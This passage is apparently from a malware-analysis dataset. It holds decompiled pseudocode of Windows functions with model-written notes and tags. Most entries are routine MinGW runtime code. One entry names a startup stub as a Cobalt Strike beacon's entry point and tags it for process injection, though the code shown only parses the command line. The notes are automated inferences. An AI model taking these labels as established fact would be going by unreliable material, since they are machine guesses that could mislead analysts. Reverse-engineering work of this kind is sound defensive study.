+      "normalized_pseudocode": "\nundefined8 _amsg_exit(uint param_1,undefined8 param_2,undefined8 param_3,int param_4)\n\n{\n  FILE *__stream;\n  undefined4 *puVar1;\n  undefined8 *puVar2;\n  undefined4 *puVar3;\n  char *pcVar4;\n  undefined8 *puVar5;\n  undefined4 *unaff_retaddr;\n  \n  __stream = (FILE *)__acrt_iob_func(2);\n  puVar5 = (undefined8 *)(ulonglong)param_1;\n  pcVar4 = \"runtime error %d\\n\";\n  fprintf(__stream,\"runtime error %d\\n\");\n  puVar3 = (undefined4 *)0xff;\n  _exit(0xff);\n  _initialize_narrow_environment();\n  _configure_narrow_argv(2 - (uint)(param_4 == 0));\n  puVar1 = (undefined4 *)__p___argc();\n  *puVar3 = *puVar1;\n  puVar2 = (undefined8 *)__p___argv();\n  *(undefined8 *)pcVar4 = *puVar2;\n  puVar2 = (undefined8 *)__p__environ();\n  *puVar5 = *puVar2;\n  _set_new_mode(*unaff_retaddr);\n  return 0;\n}\n",
+      "raw_pseudocode": "\nundefined8 _amsg_exit(uint param_1,undefined8 param_2,undefined8 param_3,int param_4)\n\n{\n  FILE *__stream;\n  undefined4 *puVar1;\n  undefined8 *puVar2;\n  undefined4 *puVar3;\n  char *pcVar4;\n  undefined8 *puVar5;\n  undefined4 *unaff_retaddr;\n  \n  __stream = (FILE *)__acrt_iob_func(2);\n  puVar5 = (undefined8 *)(ulonglong)param_1;\n  pcVar4 = \"runtime error %d\\n\";\n  fprintf(__stream,\"runtime error %d\\n\");\n  puVar3 = (undefined4 *)0xff;\n  _exit(0xff);\n  _initialize_narrow_environment();\n  _configure_narrow_argv(2 - (uint)(param_4 == 0));\n  puVar1 = (undefined4 *)__p___argc();\n  *puVar3 = *puVar1;\n  puVar2 = (undefined8 *)__p___argv();\n  *(undefined8 *)pcVar4 = *puVar2;\n  puVar2 = (undefined8 *)__p__environ();\n  *puVar5 = *puVar2;\n  _set_new_mode(*unaff_retaddr);\n  return 0;\n}\n\n"
+    },
+    {
+      "function_address": "5368716016",
+      "function_name": "__mingw_mark_section_writable",
+      "confidence": 0.9,
+      "parameters": [
+        {
+          "name": "addr",
+          "type": "void*"
+        }
+      ],
+      "return_type": "void",
+      "notes": "This MinGW-w64 runtime internal function initializes a cached array of PE sections on first call, then locates the section containing the input address and marks it writable via VirtualProtect to support runtime relocations. The initial error message, recursive error handler call, and abort are bogus control flow inserted for obfuscation and are unreachable in actual execution. Evidence includes callers _pei386_runtime_relocator (which requires writable sections for relocation patching) and mark_section_writable, along with use of MinGW PE helpers __mingw_GetSectionForAddress and _GetPEImageBase, and Windows APIs VirtualQuery and VirtualProtect.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 9442,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-c8f008513992b29dfa2a5662c4dcf723.019fdf37adf17c72b831e6d5ad4e6f21",
+        "system_fingerprint": null,
+        "prompt_tokens": 3139,
+        "completion_tokens": 13373,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n\nvoid _text(char *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)\n\n{\n  undefined1 *puVar1;\n  int tmp_iVar2;\n  undefined4 tmp_uVar3;\n  FILE *tmp_pFVar4;\n  ulonglong *puVar5;\n  longlong tmp_lVar6;\n  longlong tmp_lVar7;\n  ulonglong tmp_uVar8;\n  undefined8 tmp_uVar9;\n  uint tmp_uVar10;\n  undefined8 local_res10;\n  undefined8 local_res18;\n  undefined8 local_res20;\n  undefined1 auStack_f8 [16];\n  FILE *pFStack_e8;\n  ulonglong uStack_e0;\n  longlong lStack_d8;\n  char *apcStack_90 [3];\n  char *pcStack_78;\n  int iStack_6c;\n  char *pcStack_60;\n  undefined8 *puStack_58;\n  \n  local_res10 = param_2;\n  local_res18 = param_3;\n  local_res20 = param_4;\n  tmp_pFVar4 = (FILE *)__acrt_iob_func(2);\n  fprintf(tmp_pFVar4,\"Mingw-w64 runtime failure:\\n\");\n  tmp_pFVar4 = (FILE *)__acrt_iob_func(2);\n  _text(tmp_pFVar4,param_1,&local_res10);\n  abort();\n  tmp_uVar8 = (ulonglong)maxSections;\n  pcStack_60 = param_1;\n  puStack_58 = &local_res10;\n  if ((int)maxSections < 1) goto LAB_140001c80;\n  tmp_uVar10 = 0;\n  puVar5 = (ulonglong *)(the_secs + 0x18);\n  do {\n    if (((FILE *)*puVar5 <= tmp_pFVar4) &&\n       (tmp_pFVar4 < (FILE *)(((FILE *)*puVar5)->_shortbuf +\n                         ((ulonglong)*(uint *)(puVar5[1] + 8) - 0x7f)))) {\n      return;\n    }\n    tmp_uVar10 = tmp_uVar10 + 1;\n    puVar5 = puVar5 + 5;\n  } while (tmp_uVar10 != maxSections);\n  do {\n    tmp_lVar6 = __mingw_GetSectionForAddress(tmp_pFVar4);\n    if (tmp_lVar6 == 0) {\nLAB_140001ca2:\n      _text(\"Address %p has no image-section\",tmp_pFVar4);\n      if (was_init_0 == 0) {\n        was_init_0 = 1;\n        pFStack_e8 = tmp_pFVar4;\n        uStack_e0 = tmp_uVar8;\n        lStack_d8 = tmp_lVar6;\n        tmp_iVar2 = __mingw_GetSectionCount();\n        maxSections = 0;\n        the_secs = auStack_f8 + -((longlong)tmp_iVar2 * 0x28 + 0xfU & -16);\n      }\n      return;\n    }\n    tmp_pFVar4 = (FILE *)(tmp_uVar8 * 0x28);\n    puVar1 = the_secs + -0x7f;\n    *(longlong *)(tmp_pFVar4->_shortbuf + (longlong)puVar1 + 0x20) = tmp_lVar6;\n    *(undefined4 *)(tmp_pFVar4->_shortbuf + (longlong)puVar1) = 0;\n    tmp_lVar7 = _GetPEImageBase();\n    tmp_lVar7 = tmp_lVar7 + (ulonglong)*(uint *)(tmp_lVar6 + 0xc);\n    *(longlong *)(tmp_pFVar4->_shortbuf + (longlong)(the_secs + -0x67)) = tmp_lVar7;\n    tmp_lVar7 = VirtualQuery(tmp_lVar7,apcStack_90,0x30);\n    if (tmp_lVar7 == 0) {\n      _text(\"  VirtualQuery failed for %d bytes at address %p\",*(undefined4 *)(tmp_lVar6 + 8),\n            *(undefined8 *)(tmp_pFVar4->_shortbuf + (longlong)(the_secs + -0x67)));\n      goto LAB_140001ca2;\n    }\n    if (((iStack_6c - 4U & -5) == 0) || ((iStack_6c - 0x40U & -65) == 0)) {\nLAB_140001c1e:\n      maxSections = maxSections + 1;\n      return;\n    }\n    tmp_uVar9 = 0x40;\n    if (iStack_6c == 2) {\n      tmp_uVar9 = 4;\n    }\n    tmp_pFVar4 = (FILE *)(tmp_pFVar4->_shortbuf + (longlong)(the_secs + -0x7f));\n    tmp_pFVar4->_IO_read_ptr = apcStack_90[0];\n    tmp_pFVar4->_IO_read_end = pcStack_78;\n    tmp_iVar2 = VirtualProtect(apcStack_90[0],pcStack_78,tmp_uVar9,tmp_pFVar4);\n    if (tmp_iVar2 != 0) goto LAB_140001c1e;\n    tmp_uVar3 = GetLastError();\n    _text(\"  VirtualProtect failed with code 0x%x\",tmp_uVar3);\nLAB_140001c80:\n    tmp_uVar8 = 0;\n  } while( true );\n}\n",
+      "raw_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) */\n/* WARNING: Removing unreachable block (ram,0x000140001e6e) */\n/* WARNING: Removing unreachable block (ram,0x000140001e80) */\n/* WARNING: Removing unreachable block (ram,0x000140001e92) */\n/* WARNING: Removing unreachable block (ram,0x000140001e9f) */\n/* WARNING: Removing unreachable block (ram,0x000140001eae) */\n\nvoid _text(char *param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)\n\n{\n  undefined1 *puVar1;\n  int iVar2;\n  undefined4 uVar3;\n  FILE *pFVar4;\n  ulonglong *puVar5;\n  longlong lVar6;\n  longlong lVar7;\n  ulonglong uVar8;\n  undefined8 uVar9;\n  uint uVar10;\n  undefined8 local_res10;\n  undefined8 local_res18;\n  undefined8 local_res20;\n  undefined1 auStack_f8 [16];\n  FILE *pFStack_e8;\n  ulonglong uStack_e0;\n  longlong lStack_d8;\n  char *apcStack_90 [3];\n  char *pcStack_78;\n  int iStack_6c;\n  char *pcStack_60;\n  undefined8 *puStack_58;\n  \n  local_res10 = param_2;\n  local_res18 = param_3;\n  local_res20 = param_4;\n  pFVar4 = (FILE *)__acrt_iob_func(2);\n  fprintf(pFVar4,\"Mingw-w64 runtime failure:\\n\");\n  pFVar4 = (FILE *)__acrt_iob_func(2);\n  _text(pFVar4,param_1,&local_res10);\n  abort();\n  uVar8 = (ulonglong)maxSections;\n  pcStack_60 = param_1;\n  puStack_58 = &local_res10;\n  if ((int)maxSections < 1) goto LAB_140001c80;\n  uVar10 = 0;\n  puVar5 = (ulonglong *)(the_secs + 0x18);\n  do {\n    if (((FILE *)*puVar5 <= pFVar4) &&\n       (pFVar4 < (FILE *)(((FILE *)*puVar5)->_shortbuf +\n                         ((ulonglong)*(uint *)(puVar5[1] + 8) - 0x7f)))) {\n      return;\n    }\n    uVar10 = uVar10 + 1;\n    puVar5 = puVar5 + 5;\n  } while (uVar10 != maxSections);\n  do {\n    lVar6 = __mingw_GetSectionForAddress(pFVar4);\n    if (lVar6 == 0) {\nLAB_140001ca2:\n      _text(\"Address %p has no image-section\",pFVar4);\n      if (was_init_0 == 0) {\n        was_init_0 = 1;\n        pFStack_e8 = pFVar4;\n        uStack_e0 = uVar8;\n        lStack_d8 = lVar6;\n        iVar2 = __mingw_GetSectionCount();\n        maxSections = 0;\n        the_secs = auStack_f8 + -((longlong)iVar2 * 0x28 + 0xfU & 0xfffffffffffffff0);\n      }\n      return;\n    }\n    pFVar4 = (FILE *)(uVar8 * 0x28);\n    puVar1 = the_secs + -0x7f;\n    *(longlong *)(pFVar4->_shortbuf + (longlong)puVar1 + 0x20) = lVar6;\n    *(undefined4 *)(pFVar4->_shortbuf + (longlong)puVar1) = 0;\n    lVar7 = _GetPEImageBase();\n    lVar7 = lVar7 + (ulonglong)*(uint *)(lVar6 + 0xc);\n    *(longlong *)(pFVar4->_shortbuf + (longlong)(the_secs + -0x67)) = lVar7;\n    lVar7 = VirtualQuery(lVar7,apcStack_90,0x30);\n    if (lVar7 == 0) {\n      _text(\"  VirtualQuery failed for %d bytes at address %p\",*(undefined4 *)(lVar6 + 8),\n            *(undefined8 *)(pFVar4->_shortbuf + (longlong)(the_secs + -0x67)));\n      goto LAB_140001ca2;\n    }\n    if (((iStack_6c - 4U & 0xfffffffb) == 0) || ((iStack_6c - 0x40U & 0xffffffbf) == 0)) {\nLAB_140001c1e:\n      maxSections = maxSections + 1;\n      return;\n    }\n    uVar9 = 0x40;\n    if (iStack_6c == 2) {\n      uVar9 = 4;\n    }\n    pFVar4 = (FILE *)(pFVar4->_shortbuf + (longlong)(the_secs + -0x7f));\n    pFVar4->_IO_read_ptr = apcStack_90[0];\n    pFVar4->_IO_read_end = pcStack_78;\n    iVar2 = VirtualProtect(apcStack_90[0],pcStack_78,uVar9,pFVar4);\n    if (iVar2 != 0) goto LAB_140001c1e;\n    uVar3 = GetLastError();\n    _text(\"  VirtualProtect failed with code 0x%x\",uVar3);\nLAB_140001c80:\n    uVar8 = 0;\n  } while( true );\n}\n\n"
+    },
+    {
+      "function_address": "5368715616",
+      "function_name": "mingw_tls_process_attach_callback",
+      "confidence": 0.9,
+      "parameters": [
+        {
+          "name": "hmodule",
+          "type": "void*"
+        },
+        {
+          "name": "dw_reason",
+          "type": "int"
+        }
+      ],
+      "return_type": "void",
+      "notes": "This is a MinGW TLS callback that initializes the C runtime multithread state (_CRT_MT) and invokes the MinGW TLS handler (__mingw_TLScallback) only when the DLL reason is DLL_PROCESS_ATTACH (1), excluding DLL_THREAD_ATTACH (2). It is called by the C runtime startup function __tmainCRTStartup during process initialization, consistent with neighboring CRT initialization functions like __do_global_ctors and __main.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 3189,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-24a54de010d033e262213a84a6afa58c.019fdf3948827ec3980459d6e4d3096d",
+        "system_fingerprint": null,
+        "prompt_tokens": 957,
+        "completion_tokens": 2953,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x0001400019a5) */\n/* WARNING: Removing unreachable block (ram,0x0001400019b0) */\n/* WARNING: Removing unreachable block (ram,0x0001400019b8) */\n/* WARNING: Removing unreachable block (ram,0x0001400019ba) */\n/* WARNING: Removing unreachable block (ram,0x0001400019c3) */\n\nvoid tls_callback_0(undefined8 param_1,int param_2)\n\n{\n  if (_CRT_MT != 2) {\n    _CRT_MT = 2;\n  }\n  if ((param_2 != 2) && (param_2 == 1)) {\n    __mingw_TLScallback();\n    return;\n  }\n  return;\n}\n",
+      "raw_pseudocode": "\n/* WARNING: Removing unreachable block (ram,0x0001400019a5) */\n/* WARNING: Removing unreachable block (ram,0x0001400019b0) */\n/* WARNING: Removing unreachable block (ram,0x0001400019b8) */\n/* WARNING: Removing unreachable block (ram,0x0001400019ba) */\n/* WARNING: Removing unreachable block (ram,0x0001400019c3) */\n\nvoid tls_callback_0(undefined8 param_1,int param_2)\n\n{\n  if (_CRT_MT != 2) {\n    _CRT_MT = 2;\n  }\n  if ((param_2 != 2) && (param_2 == 1)) {\n    __mingw_TLScallback();\n    return;\n  }\n  return;\n}\n\n"
+    },
+    {
+      "function_address": "5368715584",
+      "function_name": "min_gw_tls_callback_wrapper",
+      "confidence": 0.9,
+      "parameters": [
+        {
+          "name": "module_handle",
+          "type": "HMODULE"
+        },
+        {
+          "name": "callback_reason",
+          "type": "DWORD"
+        }
+      ],
+      "return_type": "void",
+      "notes": "This function is a TLS callback (evidenced by neighboring tls_callback_0 and standard TLS callback structure) that acts as a filtered wrapper for the resolved MinGW TLS handler __mingw_tls_callback. It only forwards TLS callback events with reason codes 0 (DLL_PROCESS_ATTACH) and 3 (DLL_PROCESS_DETACH) to the MinGW handler, ignoring thread-related attach/detach events, and supports MinGW runtime initialization and cleanup for the binary.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 2755,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-26ad9b156da63f0ccafae2fb5e6236af.019fdf3948bf763cad857e238bc09cca",
+        "system_fingerprint": null,
+        "prompt_tokens": 803,
+        "completion_tokens": 5203,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nvoid tls_callback_1(undefined8 param_1,int param_2)\n\n{\n  if ((param_2 != 3) && (param_2 != 0)) {\n    return;\n  }\n  __mingw_TLScallback();\n  return;\n}\n",
+      "raw_pseudocode": "\nvoid tls_callback_1(undefined8 param_1,int param_2)\n\n{\n  if ((param_2 != 3) && (param_2 != 0)) {\n    return;\n  }\n  __mingw_TLScallback();\n  return;\n}\n\n"
+    },
+    {
+      "function_address": "5368720352",
+      "function_name": "cobalt_beacon_main",
+      "confidence": 0.9,
+      "parameters": [],
+      "return_type": "void",
+      "notes": "This function acts as the C runtime startup bridge for a Cobalt Strike beacon, initializing the CRT, parsing the command line to extract the correct lpCmdLine for WinMain (handling DBCS lead bytes and quoted arguments), retrieving STARTUPINFOA to set the nCmdShow parameter (defaulting to SW_SHOWDEFAULT if the STARTF_FORCEOFFFEEDBACK flag is unset), then invoking the beacon's core cobalt_beacon_inject_and_cleanup routine (decompiled as WinMain) with the prepared arguments. Evidence includes the caller __tmainCRTStartup (standard CRT GUI entry point), the resolved direct callee cobalt_beacon_inject_and_cleanup, and neighboring process enumeration APIs (CreateToolhelp32Snapshot, Process32First, Process32Next) used for injection target selection in Cobalt Strike beacons.",
+      "behavior_tags": [
+        "process-injection",
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 4275,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-e5bad87f60a0039003faef5751cafe8d.019fdf39488b727b99d3c2f3996e7055",
+        "system_fingerprint": null,
+        "prompt_tokens": 1382,
+        "completion_tokens": 10418,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\nvoid main(void)\n\n{\n  char *pcVar1;\n  bool tmp_bVar2;\n  bool tmp_bVar3;\n  bool tmp_bVar4;\n  int tmp_iVar5;\n  undefined8 *puVar6;\n  char tmp_cVar7;\n  char *pcVar8;\n  undefined1 local_88 [60];\n  undefined2 local_48;\n  \n  tmp_bVar3 = false;\n  tmp_bVar2 = false;\n  __main();\n  puVar6 = (undefined8 *)__p__acmdln();\n  pcVar8 = (char *)*puVar6;\n  if (pcVar8 == (char *)0x0) {\n    pcVar8 = \"\";\n  }\n  else {\nLAB_140002c10:\n    tmp_cVar7 = *pcVar8;\n    if (' ' < tmp_cVar7) goto LAB_140002c3d;\n    while (tmp_cVar7 != '\\0') {\n      if (!tmp_bVar2) goto LAB_140002c64;\n      tmp_iVar5 = IsDBCSLeadByte();\n      pcVar1 = pcVar8;\n      while( true ) {\n        pcVar8 = pcVar1 + 1;\n        if ((tmp_iVar5 == 0) || (pcVar1[1] == '\\0')) goto LAB_140002c10;\n        tmp_cVar7 = pcVar1[2];\n        pcVar8 = pcVar1 + 2;\n        if (tmp_cVar7 < '!') break;\nLAB_140002c3d:\n        tmp_bVar4 = (bool)(tmp_bVar2 ^ 1);\n        tmp_bVar2 = tmp_bVar3;\n        if (tmp_cVar7 == '\\\"') {\n          tmp_bVar2 = tmp_bVar4;\n        }\n        tmp_iVar5 = IsDBCSLeadByte();\n        pcVar1 = pcVar8;\n        tmp_bVar3 = tmp_bVar2;\n      }\n    }\n  }\n  goto LAB_140002c70;\n  while (*pcVar1 < '!') {\nLAB_140002c64:\n    pcVar1 = pcVar8 + 1;\n    pcVar8 = pcVar8 + 1;\n    if (*pcVar1 == '\\0') break;\n  }\nLAB_140002c70:\n  GetStartupInfoA(local_88);\n  if ((local_4c & 1) == 0) {\n    local_48 = 10;\n  }\n  WinMain(&IMAGE_DOS_HEADER_140000000,0,pcVar8,local_48);\n  return;\n}\n",
+      "raw_pseudocode": "\nvoid main(void)\n\n{\n  char *pcVar1;\n  bool bVar2;\n  bool bVar3;\n  bool bVar4;\n  int iVar5;\n  undefined8 *puVar6;\n  char cVar7;\n  char *pcVar8;\n  undefined1 local_88 [60];\n  byte local_4c;\n  undefined2 local_48;\n  \n  bVar3 = false;\n  bVar2 = false;\n  __main();\n  puVar6 = (undefined8 *)__p__acmdln();\n  pcVar8 = (char *)*puVar6;\n  if (pcVar8 == (char *)0x0) {\n    pcVar8 = \"\";\n  }\n  else {\nLAB_140002c10:\n    cVar7 = *pcVar8;\n    if (' ' < cVar7) goto LAB_140002c3d;\n    while (cVar7 != '\\0') {\n      if (!bVar2) goto LAB_140002c64;\n      iVar5 = IsDBCSLeadByte();\n      pcVar1 = pcVar8;\n      while( true ) {\n        pcVar8 = pcVar1 + 1;\n        if ((iVar5 == 0) || (pcVar1[1] == '\\0')) goto LAB_140002c10;\n        cVar7 = pcVar1[2];\n        pcVar8 = pcVar1 + 2;\n        if (cVar7 < '!') break;\nLAB_140002c3d:\n        bVar4 = (bool)(bVar2 ^ 1);\n        bVar2 = bVar3;\n        if (cVar7 == '\\\"') {\n          bVar2 = bVar4;\n        }\n        iVar5 = IsDBCSLeadByte();\n        pcVar1 = pcVar8;\n        bVar3 = bVar2;\n      }\n    }\n  }\n  goto LAB_140002c70;\n  while (*pcVar1 < '!') {\nLAB_140002c64:\n    pcVar1 = pcVar8 + 1;\n    pcVar8 = pcVar8 + 1;\n    if (*pcVar1 == '\\0') break;\n  }\nLAB_140002c70:\n  GetStartupInfoA(local_88);\n  if ((local_4c & 1) == 0) {\n    local_48 = 10;\n  }\n  WinMain(&IMAGE_DOS_HEADER_140000000,0,pcVar8,local_48);\n  return;\n}\n\n"
+    },
+    {
+      "function_address": "5368716112",
+      "function_name": "ensure_target_section_writable",
+      "confidence": 0.9,
+      "parameters": [
+        {
+          "name": "target_addr",
+          "type": "void*"
+        }
+      ],
+      "return_type": "void",
+      "notes": "This function ensures the PE section containing the input target address is writable, using a cache of processed sections to avoid redundant VirtualProtect calls. It is called by _pei386_runtime_relocator (5368716480) to prepare memory for applying relocation fixes, using __mingw_GetSectionForAddress to resolve address-to-section mappings, VirtualQuery to check existing memory protection, and VirtualProtect to set PAGE_READWRITE or PAGE_EXECUTE_READWRITE as needed. Error messages are logged for failed VirtualQuery/VirtualProtect operations or addresses with no associated image section.",
+      "behavior_tags": [
+        "utility"
+      ],
+      "source": "llm_judge",
+      "prompt_length": 8714,
+      "llm_audit": {
+        "request_model": null,
+        "response_model": "step-3.7-flash",
+        "response_id": "chatcmpl-f3821b69c62c5098e94efffa13cd5d94.019fdf3948ba7c7ebbf9370c51069765",
+        "system_fingerprint": null,
+        "prompt_tokens": 2845,
+        "completion_tokens": 11797,
+        "reasoning_tokens": 0,
+        "is_reasoning_model": false
+      },
+      "normalized_pseudocode": "\n/* WARNING: Function: ___chkstk_ms replaced with injection: alloca_probe */\n/* WARNING: Removing unreachable block (ram,0x000140001d49) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec0) */\n/* WARNING: Removing unreachable block (ram,0x000140001ec8) */\n/* WARNING: Removing unreachable block (ram,0x00014000202b) */\n/* WARNING: Removing unreachable block (ram,0x000140002036) */\n/* WARNING: Removing unreachable block (ram,0x000140001d53) */\n/* WARNING: Removing unreachable block (ram,0x000140001d5d) */\n/* WARNING: Removing unreachable block (ram,0x000140001ed5) */\n/* WARNING: Removing unreachable block (ram,0x000140001ede) */\n/* WARNING: Removing unreachable block (ram,0x000140001ef0) */\n/* WARNING: Removing unreachable block (ram,0x000140001f20) */\n/* WARNING: Removing unreachable block (ram,0x000140001d68) */\n/* WARNING: Removing unreachable block (ram,0x000140001d74) */\n/* WARNING: Removing unreachable block (ram,0x000140001d84) */\n/* WARNING: Removing unreachable block (ram,0x000140001dfd) */\n/* WARNING: Removing unreachable block (ram,0x000140001f80) */\n/* WARNING: Removing unreachable block (ram,0x000140001f8b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e19) */\n/* WARNING: Removing unreachable block (ram,0x000140001d90) */\n/* WARNING: Removing unreachable block (ram,0x000140001f28) */\n/* WARNING: Removing unreachable block (ram,0x000140002020) */\n/* WARNING: Removing unreachable block (ram,0x000140001f34) */\n/* WARNING: Removing unreachable block (ram,0x000140001f40) */\n/* WARNING: Removing unreachable block (ram,0x000140001f4e) */\n/* WARNING: Removing unreachable block (ram,0x000140001f5a) */\n/* WARNING: Removing unreachable block (ram,0x000140001d99) */\n/* WARNING: Removing unreachable block (ram,0x000140001da2) */\n/* WARNING: Removing unreachable block (ram,0x000140001fe0) */\n/* WARNING: Removing unreachable block (ram,0x000140001daf) */\n/* WARNING: Removing unreachable block (ram,0x000140001dcb) */\n/* WARNING: Removing unreachable block (ram,0x000140001dd7) */\n/* WARNING: Removing unreachable block (ram,0x000140001ff6) */\n/* WARNING: Removing unreachable block (ram,0x000140002010) */\n/* WARNING: Removing unreachable block (ram,0x000140001f9e) */\n/* WARNING: Removing unreachable block (ram,0x000140001fac) */\n/* WARNING: Removing unreachable block (ram,0x000140001fb4) */\n/* WARNING: Removing unreachable block (ram,0x000140001df4) */\n/* WARNING: Removing unreachable block (ram,0x000140001e1f) */\n/* WARNING: Removing unreachable block (ram,0x00014000203f) */\n/* WARNING: Removing unreachable block (ram,0x000140002053) */\n/* WARNING: Removing unreachable block (ram,0x000140002070) */\n/* WARNING: Removing unreachable block (ram,0x000140002099) */\n/* WARNING: Removing unreachable block (ram,0x000140001e28) */\n/* WARNING: Removing unreachable block (ram,0x000140001e5b) */\n/* WARNING: Removing unreachable block (ram,0x000140001e60) 